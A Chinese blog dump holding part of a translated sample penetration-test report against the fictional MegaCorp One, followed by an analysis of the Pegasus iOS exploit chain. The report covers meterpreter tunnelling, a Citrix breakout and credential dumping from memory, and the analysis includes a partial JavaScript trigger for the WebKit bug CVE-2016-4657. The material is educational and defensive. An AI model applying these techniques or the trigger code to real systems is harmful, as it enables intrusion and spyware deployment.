<p>Figure 19-使用Microsoft发布的加密密钥，这个加密密码很容易解密</p>
<p>使用这个明文密码，得到客户机的本地管理员权限。</p>
<h3 id="深包检测规避"><a href="#深包检测规避" class="headerlink" title="深包检测规避"></a>深包检测规避</h3><p>当尝试建立进入受损系统的附加层时，遇到了进攻性出口过滤。这还是第一次碰到，当为Microsoht远程桌面协议建立加密的出口隧道。</p>
<p>Figure 20-初步尝试建立RDP的出隧道被出口过滤系统阻止</p>
<p>另外，当尝试连接攻击者的在80端口上的SSH服务器时，发现网络协议强制执行。我们创建了一个隧道来避开过滤，这个隧道有个运行的meterpreter会话，允许获取攻击者分享的文件。用这个会话在受损主机上用本地管理员权限运行windows SHELL。在这个shell里，执行一段额外的meterpreter关键代码。</p>
<p>Figure 21-通过最初的meterpreter会话建立端口转发， 可以直接访问受损主机</p>
<p>Figure 22-用这个新建立的连接来获得主机的shell</p>
<p>Figure 23-在10.7.0.22上用本地管理员权限建立一个meterpreter shell</p>
<p>有了这个meterpreter shell，就可以利用HTTP-Tunnel，这是一个开源程序，（<a href="http://http-tunnel.sourceforge.net/%EF%BC%89%E5%8E%BB%E5%B0%81%E8%A3%85HTTP%E8%B4%9F%E8%BD%BD%E5%86%85%E7%9A%84%E4%BB%BB%E6%84%8F%E6%B5%81%E9%87%8F%E3%80%82%E6%AF%94%E5%A6%82%E5%B0%81%E8%A3%85%E6%94%BB%E5%87%BB%E8%80%85%E5%92%8C%E4%B8%BB%E6%9C%BA%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E3%80%82%E8%BF%99%E4%B9%8B%E5%90%8E%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E5%AE%8C%E6%95%B4%E7%9A%84%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F%EF%BC%8C%E8%80%8C%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AF%E5%91%BD%E4%BB%A4%E8%A1%8C%E3%80%82%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E6%98%AF%E7%94%A8%E2%80%9Cmike%E2%80%9C%E8%BF%99%E4%B8%AA%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%88%9B%E5%BB%BA%E7%9A%84%EF%BC%8C%E2%80%9Dmike%E2%80%9C%E7%9A%84%E5%AF%86%E7%A0%81%E5%B0%B1%E6%98%AF%E4%B9%8B%E5%89%8D%E4%BB%8ESQLite">http://http-tunnel.sourceforge.net/）去封装HTTP负载内的任意流量。比如封装攻击者和主机的远程桌面连接数据。这之后，我们就可以得到完整的访问方式，而不仅仅是命令行。远程桌面连接是用“mike“这个用户的密码创建的，”mike“的密码就是之前从SQLite</a> Manager发现的。详情请看附录A。</p>
<p>Figure 24-通过http隧道屏蔽过滤协议，建立远程桌面连接</p>
<p>此时，MefaCorp One的网络已被完全攻陷，如图25所示。我们能够以控制台的权限访问一台Megacorp One信任的电脑。只是访问受限，因为是靠一个无特权的域用户，和一个本地管理员账户。</p>
<p>Figure 25-到达管理员子网</p>
<h3 id="Citrix环境下的漏洞"><a href="#Citrix环境下的漏洞" class="headerlink" title="Citrix环境下的漏洞"></a>Citrix环境下的漏洞</h3><p>我们用远程桌面访问方式进入内部网络，继续扫描以发现有价值的目标。找到了一个Citrix的服务器，在受损主机上它被设置成主页。使用和建立远程桌面连接相同的证书，成功登录Citrix。</p>
<p>Figure 26-发现一台支持ie的Citrix服务器</p>
<p>此Citrix环境说明“ie“是唯一可使用的程序。这种做法被很多组织采用来限制进入Citrix服务器底层的操作系统。但是有很多的方法可以绕过限制。这里，我们用”Save“这个对话框生成一个批处理文件，其能让我们使用Powershell。</p>
<p>这样做可能成功，因为“Save”对话框的操作方式大致相同，都是“Windows Explorer”的文件管理窗口。</p>
<p>Figure 27-使用Save对话框有可能突破Citrix环境下的限制</p>
<p>Figure 28-在Citrix上创建有Powershell程序的批处理文件</p>
<p>Figure 29-执行Pwershell突破Citrix的限制</p>
<p>Powershell也可以用来下载恶意的代码，这些代码创建底层服务器的meterpreter会话。</p>
<p>Figure 30-Powershell允许终端用户接受任意源的文件，包括远程网络地址</p>
<p>利用Save对话框运行任意可执行的代码，可以和之前的发现结合在一起，之前发现了本地账户密码，可以以管理员的权限执行程序。这就取得了这个系统的完整的管理员控制权。详情请看附录A。</p>
<p>Figure 31-攻击者利用管理员密码以管理员权限执行恶意代码</p>
<p>Figure 32-完成Citrix服务器的完全控制</p>
<p>Figure 33-在管理员内网中添加了一台主机</p>
<h3 id="升级为域管理员"><a href="#升级为域管理员" class="headerlink" title="升级为域管理员"></a>升级为域管理员</h3><p>有了这台受损Citrix服务器，我们试着在内存中搜索密码。Citrix服务器是这种攻击了的理想的候选，因为可以操作很长时间，而不用重启还有为大量用户提供服务。</p>
<p>我们用Windows Credential Editor这个工具来得到内存中的密码，因为它可以运行在64位的系统上且不会产生错误。</p>
<p>Figure 34-用Windows Credentials Editor得到服务器上的明文密码</p>
<p>这个工具爆出了很多的密码，包括Windows域管理员的密码。详情请看附录A。为了使恢复出来的凭证有效，我们用域管理员权限创建新的远程桌面连接会话。</p>
<p>Figure 35-域管理员证书有效<br>此时，可以控制整个Windows域了。一个恶意攻击者有许多的工具可以用，包括：<br>    在Windows系统上利用组策略上传后门程序。<br>    对任何使用Windows身份验证的系统上存储的所有数据进行排除。<br>    销毁任何以及所有网络资源。<br>    有目的性的攻击MegaCorp One任一职员，通过信息收集工具，例如可以辨认个人信息的keystroke loggers<br>    泄露对MegaCorp One信任的伙伴或支持组织的系统进入方式，便可以展开攻击</p>
<p>可以确定，这些步骤是可行的，且可以在当前环境之外使用。很明显，已经攻陷了整个MegaCorp One域，本地所有系统已经失去了一体性。</p>
<p>Figure 36-攻陷域</p>
<h2 id="总论"><a href="#总论" class="headerlink" title="总论"></a>总论</h2><p>MegaCorp One有一系列的配置错误，而使关键公司资产泄露。如果一个恶意的组织利用这些错误，会产生恶劣的影响。现有的关于密码重用，上传控制的策略还不完善，不能消除漏洞发现产生的影响。</p>
<p>这次渗透测试的具体目标如下：<br>    确认远程攻击者能否攻破MegaCorp One的防御系统<br>    确定安全漏洞的影响：<br>    组织信息的机密性<br>    MegaCorp One信息系统的内部基础结构和可用性</p>
<p>这次渗透测试完成了这些目标。一次攻击就可以获得所有的联合资产。许多被认为是小事的问题会被一起利用，造成了系统的沦陷。值得注意的是，整个Megacorp One安全基础设施的崩溃很大程度上归因于对网络边界和主机级别的访问控制不足。需要引进有效的网络分层系统以减轻因整个Megacorp One基础设施的级联安全故障所产生的影响。</p>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>因为这次渗透暴露了整个系统架构，所以合适的资源分配可以确保修补工作可在短时间内完成。虽然需要修复的漏洞的完整表单不会提供，但一些高危漏洞需要说明。</p>
<p>安全建议如下：</p>
<ol>
<li>   确保组织的任何地方都使用了强凭证。在系统的不同安全层级上使用弱密码和相同的密码，会使攻击更加容易。可以参考NIST SP 800-11（<a href="http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdf%EF%BC%89%E6%9D%A5%E5%88%B6%E5%AE%9A%E4%BC%81%E4%B8%9A%E7%9A%84%E5%AF%86%E7%A0%81%E6%9D%A1%E6%AC%BE%E3%80%82%E8%99%BD%E7%84%B6%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E5%AD%98%E5%9C%A8%E4%B8%8D%E5%B9%BF%EF%BC%8C%E4%BD%86%E4%BB%8D%E7%84%B6%E6%98%AF%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%8C%E9%9C%80%E8%A6%81%E8%A7%A3%E5%86%B3%E3%80%82">http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdf）来制定企业的密码条款。虽然这个问题存在不广，但仍然是个问题，需要解决。</a></li>
<li>   建立信任带。在内网中合适的地方建立信任逻辑边界。每个逻辑信任部分应相互联合，不能轻易破坏而连上其他部分。所以要使用不同的管理员账号，这样某一部分受损了，但不会影响到其他部分。</li>
<li>   在所有系统中实行变更控制：在不同的系统中都发现了配置错误和上传漏洞。通过变更控制可减轻这些漏洞带来的风险。</li>
<li>   实施补丁管理程序：按照NIST SP 800-40（<a href="http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdf%EF%BC%89%E6%9D%A5%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%A1%A5%E4%B8%81%E7%AE%A1%E7%90%86%E7%A8%8B%E5%BA%8F%EF%BC%8C%E8%BF%99%E5%AF%B9%E5%8F%AF%E6%8C%81%E7%BB%AD%E7%9A%84%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E6%9D%A5%E8%AF%B4%E6%98%AF%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E7%BB%84%E4%BB%B6%E3%80%82%E8%BF%99%E5%B0%86%E6%9C%89%E5%8A%A9%E4%BA%8E%E9%99%90%E5%88%B6%E7%94%B1%E4%BA%8E%E6%9C%AA%E4%BF%AE%E8%A1%A5%E8%80%8C%E5%AF%BC%E8%87%B4%E7%9A%84%E6%94%BB%E5%87%BB%E3%80%82">http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdf）来创建一个补丁管理程序，这对可持续的安全环境来说是一个重要组件。这将有助于限制由于未修补而导致的攻击。</a></li>
<li>   施行常规漏洞评估。作为有效组织风险管理策略的一部分，漏洞评估要在常规部分执行。这有助于组织确定安全控制是否正确配置，操作是否如预期般执行，是否生成了想要的结果。参照NIST SP 800-30（<a href="http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201%EF%BC%89%E5%BB%BA%E7%AB%8B%E9%AB%98%E6%95%88%E7%9A%84%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%82">http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201）建立高效的风险管理系统。</a><h3 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h3>对MegaCorp One风险评定的结果为高。外部攻击者可以获得整个系统的控制权。有理由相信一个恶意的组织能够施行有效的目标攻击。</li>
</ol>
<p> </p>
<h2 id="附录A：漏洞细节及减轻危害"><a href="#附录A：漏洞细节及减轻危害" class="headerlink" title="附录A：漏洞细节及减轻危害"></a>附录A：漏洞细节及减轻危害</h2><h3 id="风险等级范围"><a href="#风险等级范围" class="headerlink" title="风险等级范围"></a>风险等级范围</h3><p>鉴于NIST SP 800-30，漏洞按照相似性及影响排列。<br>默认的或弱的凭证<br>级别：高<br>描述：一个公共管理界面仅靠一个弱密钥保护。<br>影响：仅靠暴力破解，就可能爆出SQLite Manager服务的管理员密码。因为缺少额外的授权凭证，这也可能爆出所有用户密码哈希值。如果密码会重用，那么爆出明文密码可以进一步攻击目标系统。<br>修复：确保所有的管理界面受强密码或口令保护。避免使用普通的或和业务相关的密码，因为可以很容易通过字典生成。</p>
<h3 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h3><p>级别：高<br>描述：“mike“在SQLite Manager和个人计算机上用了相同的密码。<br>影响：重复用相同的密码是一个非常差的习惯，应该尽量避免。这个漏洞的影响很恶劣，因为外部攻击者直接获得了内网计算机的有效凭证。这可能暴露更多的可攻击的界面。<br>修复：升级密码管理策略，所有隔离服务强制使用复杂的，不同的密码。密码管理系统要使雇员方便的使用不同的密码进入不同的系统。</p>
<h3 id="共享本地管理员密码"><a href="#共享本地管理员密码" class="headerlink" title="共享本地管理员密码"></a>共享本地管理员密码</h3><p>级别：高<br>描述：多台主机使用了相同的本地管理员密码。<br>影响：MegaCorp One使用组策略来设置GPO内所有主机的本地管理员密码。结果，攻击者就可以利用著名的攻击工具“PASS-THE-HASH“来攻击，登录所有使用相同密码及相同密码哈希值的主机。如此，攻击者不用破译密码哈希值，大大增加了安全风险。<br>修复：强烈建议禁止使用本地管理员账户。实在要用的话，应分配一个不同的名字及复杂随机的密码。</p>
<h3 id="补丁管理"><a href="#补丁管理" class="headerlink" title="补丁管理"></a>补丁管理</h3><p>级别：高<br>描述：MegaCorp One内外部环境中有许多未打补丁的系统和程序。<br>影响：弱授权机制和未打补丁的主机，都包含可以用爆破的漏洞，这会使得攻击者以未授权的方式得到大量的公司资产。特别地，例如SQLiite Manager包含远程执行代码的漏洞，底层主机也有一个本地提权的漏洞，这些可以使对外开放的主机轻易地被攻陷。表明了补丁管理策略以及强制执行的不足。<br>修复：所有的公司资产都要及时打上供应商提供的补丁。要完成这些可以使用供应商官方工具或者第三方程序，这些都能检查出未应用的补丁。在许多例子中，第三方工具也可以用来在一个混乱的环境中进行补丁部署。</p>
<h3 id="DNS区域传送"><a href="#DNS区域传送" class="headerlink" title="DNS区域传送"></a>DNS区域传送</h3><p>级别：低<br>描述：一个错误配置的DNS服务器允许无限制的区域传送。<br>影响：一个配置成可与任何DNS服务器传输数据的DNS服务器，会泄露关于公司资产和网络布局等敏感信息。<br>修复：DNS区域传送需仅对已证明的服务器开放。</p>
<h3 id="默认APACHE文件目录"><a href="#默认APACHE文件目录" class="headerlink" title="默认APACHE文件目录"></a>默认APACHE文件目录</h3><p>级别：低<br>描述：在admin.megacorpone.com主机上发现了默认的Apache文件目录。<br>影响：攻击者通过检查默认文件夹可能猜出Apache服务器的版本。敏感信息也可能泄露。<br>修复：移除公开网站的所有默认文件。</p>
<h2 id="附录B-关于Offensive-Security"><a href="#附录B-关于Offensive-Security" class="headerlink" title="附录B:关于Offensive Security"></a>附录B:关于Offensive Security</h2><p>Offensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。<br>黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。<br>黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。<br>Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。<br>请通过<a href="mailto:&#x69;&#x6e;&#x66;&#x6f;&#64;&#111;&#102;&#102;&#115;&#x65;&#99;&#46;&#99;&#111;&#x6d;">&#x69;&#x6e;&#x66;&#x6f;&#64;&#111;&#102;&#102;&#115;&#x65;&#99;&#46;&#99;&#111;&#x6d;</a>联系我们。</p>
]]></content>
      <tags>
        <tag>penetation test</tag>
      </tags>
  </entry>
  <entry>
    <title>pegasus分析</title>
    <url>/2019/04/16/pegasus%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="PEGASUS攻击分析"><a href="#PEGASUS攻击分析" class="headerlink" title="PEGASUS攻击分析"></a>PEGASUS攻击分析</h1><h6 id="参考-lookout-report"><a href="#参考-lookout-report" class="headerlink" title="参考 lookout report"></a>参考 <a href="https://info.lookout.com/rs/051-ESQ-475/images/pegasus-exploits-technical-details.pdf" title="lookout report">lookout report</a></h6><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。</p>
<h5 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h5><p>传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。</p>
<h5 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h5><p>越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。</p>
<a id="more"></a>

<h5 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h5><p>安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。</p>
<p>第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。</p>
<h2 id="CVE-2016-4657"><a href="#CVE-2016-4657" class="headerlink" title="CVE-2016-4657"></a>CVE-2016-4657</h2><p>第一阶段用到了<strong>WebKit’s JavaScriptCore library</strong> 中的漏洞<strong>CVE-2016-4657</strong>。让Safari运行一段JavaScript payload，以此来获得Safari WebContent进程的代码执行权。</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>MarkedArgumentBuffer中的<strong>slowAppend()**函数中存在这个漏洞，并且可以在静态方法</strong>definePropertries()**中使用MarkedArgumentBuffer来利用这个漏洞。definePropertries()接受一个对象，这个对象的可枚举变量构成要在另一个目标对象上定义或修改的属性的描述符。算法链接这些变量和目标对象，基于变量列表进行两次迭代。在第一个部分，检查每个变量的格式，并创建一个有默认值的PropertyDescriptor对象。<br> <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">MarkedArgumentBuffer markBuffer;</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params">size_t i =<span class="number">0</span>;i&lt;numProperties;i++</span>)</span>&#123;</span><br><span class="line">	JSValue prop = properties-&gt;get(exec,propertyNames[i]);</span><br><span class="line">	<span class="keyword">if</span>(exec-&gt;hadException())</span><br><span class="line">		<span class="keyword">return</span> jsNull();</span><br><span class="line">	PropertyDescriptor descriptor;</span><br><span class="line">	<span class="keyword">if</span>(!toPropertyDescriptor(exec, prop,descriptor))</span><br><span class="line">		<span class="keyword">return</span> jsNull();</span><br><span class="line">	descriptors.append(descriptor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果每一个变量都是有效的，那么第二部分就会执行。这个部分将用户提供的属性变量与目标对象结合在一起，通过defineOwnProperty()实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">size_t i=<span class="number">0</span>;i&lt;numProperties; i++</span>)</span>&#123;</span><br><span class="line">	Identifier propertyName = propertyNames[i];</span><br><span class="line">	<span class="keyword">if</span>(exec-&gt;propertyName().isPrivateName(properName))</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法可能调用用户自定义的JavaScript方法（使用已定义的属性）。这样，内存回收会被触发，导致未标记的堆备份重新分配。因此，对descriptor向量PropertyDescriptor存储的对象的引用要独立标记，确保不被回收。这里，使用了<strong>MarkedArgumentBuffer</strong>，临时存储变量值，防止被回收。</p>
<p>首先，来理解JavaScriptCore的垃圾回收机制，当对象不在被使用，或者WebContentjin进程占用更多内存的时候会回收内存。系统会遍历栈，确定对象是否被引用。堆中也可能引用对象，但只在特殊情况中。</p>
<p>MarkedArgumentBuffer维持一个<strong>inline</strong>栈表，由各个值组成。但进行垃圾回收时，每个值会被标记，其代表的对象就会避免回收释放。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarkedArgumentBuffer</span> </span>&#123;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">		<span class="keyword">static</span> <span class="keyword">const</span> size_t inlineCapacity=<span class="number">8</span>;</span><br><span class="line">	...</span><br><span class="line">	public:</span><br><span class="line">	...</span><br><span class="line">		MarkedArgumentBuffer()</span><br><span class="line">			:m_size(<span class="number">0</span>)</span><br><span class="line">			,m_capacity(inlineCapacity)</span><br><span class="line">			,m_buffer(m_inlineBuffer)</span><br><span class="line">			,m_markSet(<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	...</span><br><span class="line">		<span class="keyword">void</span> <span class="function"><span class="title">append</span>(<span class="params">JSValue v</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(m_size &gt;= m_capacity)</span><br><span class="line">			<span class="keyword">return</span> slowAppend(v);</span><br><span class="line">		</span><br><span class="line">		slotFor(m_size)=JSValue::encode(v);</span><br><span class="line">		++m_size;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">	...</span><br><span class="line">		int m_size;</span><br><span class="line">		int m_capacity;</span><br><span class="line">		EncodedJSValue m_inlineBuffer[inlineCapacity];</span><br><span class="line">		EncodeedJSValue* m_buffer;</span><br><span class="line">		ListSet* m_markSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>inline栈只能存8个值。当向MarkedArgumentBuffer添加第九个值时，就移到堆中，能够存储的值也扩大了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> MarkedArgumentBuffer::<span class="function"><span class="title">slowAppend</span>(<span class="params">JSValue v</span>)</span>&#123;</span><br><span class="line">	int newCapacity = m_capacity*<span class="number">4</span>;</span><br><span class="line">	EncodedJSValue* newBuffer = <span class="keyword">new</span> EncodeedJSValue[newCapacity];</span><br><span class="line">	<span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;m_capacity;++i)</span><br><span class="line">		newBuffer[i]=m_buffer[i];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (EncodedJSValue* base=mallocBase())</span><br><span class="line">		<span class="keyword">delete</span> [] base;</span><br><span class="line">	</span><br><span class="line">	m_buffer=newBuffer;</span><br><span class="line">	m_capacity=newCapacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一旦移动到堆中，这些值就不再被垃圾回收机制保护。MarkedArgumentBuffer里的值会添加到堆中的<strong>m_markListSet</strong>并被标记，确保不会释放回收。当MarkedArgumentBuffer移到堆中时，也要移动<strong>markListSet</strong>中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//As long as our size stays within our Vetor&#x27;s inline</span></span><br><span class="line"><span class="comment">//capacity, all our values are allocated on the stack, and </span></span><br><span class="line"><span class="comment">//therefore don&#x27;t need explicit marking. Once our size exceeds </span></span><br><span class="line"><span class="comment">//our Vector&#x27;s inline capacity, though, our values move to the </span></span><br><span class="line"><span class="comment">//heap, where they do need explicit marking.</span></span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span>; i&lt;m_size;++i)&#123;</span><br><span class="line">	Heap* heap=Heap::heap(JSValue::decode(slotFor(i)));</span><br><span class="line">	<span class="keyword">if</span>(!heap)</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	m_markSet = &amp;heap-&gt;markListSet();</span><br><span class="line">	m_markSet-&gt;add(<span class="built_in">this</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码请求了一个堆，把MarkedArgumentBuffer添加到堆中的markListSet。但只有第九个值加入MarkedArgumentBuffer才调用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">inline Heap* Heap::<span class="function"><span class="title">heap</span>(<span class="params"><span class="keyword">const</span> JSValue v</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!v.isCell())</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> heap(v.asCell());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>JSValue</strong>有一个tag，说明它编码的值的类型。在一个复杂的对象中，tag为CellTag，JSValue创建一指针指向堆中的值。对简单类型来说，变量可以直接解码成JSValue（例如整形，布尔型，null，还有未定义的），在堆中存储这样的值是多余的，还会创建一个tag。**JSValue::isCell() **函数决定是否在堆中创建指针指向单元格。因为简单类型不会指向堆，为这些类型指定堆没有意义，只会返回null。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">inline bool JSValue::isCell() <span class="keyword">const</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(u.asInt64&amp;TagMask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，如果要添加到MarkedArgumentBuffer的第九个值不是一个堆备份值，当请求堆时会返回NULL， MarkedArgumentBuffer也不会添加到堆markListSet中。MarkedArgumentBuffer就不在起作用，第九个值以后的值可以被释放回收。descriptor向量里的堆值，被引用后，可能会被污染。实际上，对这些值的另一个引用仍然存在（defineDescriptor()有JavaScript的变量）。在垃圾回收前，余下的JSValue的引用必须先移去，以使descriptor向量里的引用被污染。<br><a href="https://imgchr.com/i/ESiMgf"><img src="https://s2.ax1x.com/2019/04/18/ESiMgf.png" alt="ESiMgf.png"></a><br>调用defineOwnDescriptor()一定会调用基于属性值的用户控制的方法。结果，最后一个对一属性值的引用可以被用户定义的JavaScript代码移去。如果垃圾回收在移去一特定值的所有引用和目标对象desceiptor向量里的值时被触发，这些释放了的空间会作为一个变量存储在目标对象上。</p>
<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>Pegasus通过向defineProperties()函数传入一系列精心制作的变量来触发这个漏洞。当这些独立变量连续添加到MarkedArgumentBuffer，这个漏洞就会触发，如果垃圾回收在关键时候及时触发，JSArray会错误释放。因为垃圾回收不一定会被触发，所以重复攻击以触发错误释放和再分配（会尝试十次），还会测试是否一个被污染的引用已经成功获得。假设垃圾回收正确触发，那么另一个对象就会分配在污染的JSArray之上。接着，设置可以获得本地代码执行权的工具，即读写权限，获取任意JavaScript对象位置。一旦这些步骤都完成了，就会创建一个payload可执行代码集。</p>
<h5 id="设置触发漏洞"><a href="#设置触发漏洞" class="headerlink" title="设置触发漏洞"></a>设置触发漏洞</h5><p>攻击使用一个JSArray对象触发漏洞代码块，获得任意代码执行权。下面这段代码触发漏洞。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2047</span>);</span><br><span class="line"><span class="keyword">var</span> not_number=&#123;&#125;;</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	arr=<span class="literal">null</span>;</span><br><span class="line">	props[<span class="string">&quot;stale&quot;</span>][<span class="string">&#x27;value&#x27;</span>]=<span class="literal">null</span>;</span><br><span class="line">	...<span class="comment">//Trigger garbage collection and reallocation over stale object</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> props=&#123;</span><br><span class="line">	p0:&#123;<span class="attr">value</span>:<span class="number">0</span>&#125;,</span><br><span class="line">	p1:&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	p2:&#123;<span class="attr">value</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	p3:&#123;<span class="attr">value</span>:<span class="number">3</span>&#125;,</span><br><span class="line">	p4:&#123;<span class="attr">value</span>:<span class="number">4</span>&#125;,</span><br><span class="line">	p5:&#123;<span class="attr">value</span>:<span class="number">5</span>&#125;,</span><br><span class="line">	p6:&#123;<span class="attr">value</span>:<span class="number">6</span>&#125;,</span><br><span class="line">	p7:&#123;<span class="attr">value</span>:<span class="number">7</span>&#125;,</span><br><span class="line">	p8:&#123;<span class="attr">value</span>:<span class="number">8</span>&#125;,</span><br><span class="line">	length:&#123;<span class="attr">value</span>:not_number&#125;,</span><br><span class="line">	stale:&#123;<span class="attr">value</span>:arr&#125;,</span><br><span class="line">	after:&#123;<span class="attr">value</span>:<span class="number">666</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> target=[];</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br></pre></td></tr></table></figure>
<p>经过特别精心编排的props对象触发slowAppend()内的漏洞。当第九个属性值添加到MarkedArgumentBuffer(P8)，slowAppend()将无法获得堆地址（因为这个值是一个简单类型，即整形，并且原先堆上没有这个值）。那么，MarkedArgumentBuffer就不能保护堆备份值（not_number和arr），当垃圾回收时就会被释放。</p>
